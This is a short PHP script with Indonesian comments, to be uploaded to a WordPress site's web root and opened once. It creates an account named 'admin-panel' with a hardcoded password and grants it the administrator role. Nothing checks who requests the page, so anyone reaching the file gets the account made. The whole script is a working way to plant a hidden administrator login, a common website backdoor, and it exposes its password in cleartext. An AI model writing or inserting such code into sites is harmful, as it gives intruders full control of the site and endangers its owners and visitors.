<?php
// create-admin-once.php — letakkan di public_html, akses sekali lalu HAPUS file ini
require_once __DIR__ . '/wp-load.php';

if ( ! defined('WPINC') ) {
    die('No WP environment detected');
}

$username = 'admin-panel';
$password = '@Sehati128';
$email    = 'admin-panel@gmail.com'; // gunakan email valid

if ( username_exists($username) || email_exists($email) ) {
    echo "User already exists. Hapus file ini sekarang.";
    exit;
}

$user_id = wp_create_user( $username, $password, $email );
if ( is_wp_error($user_id) ) {
    echo 'Error creating user: ' . esc_html( $user_id->get_error_message() );
} else {
    $user = new WP_User( $user_id );
    $user->set_role('administrator');
    echo "✅ User created: <strong>" . esc_html($username) . "</strong> (ID {$user_id}).";
    echo "<br>⚠️ Segera hapus file create-admin-once.php demi keamanan.";
}
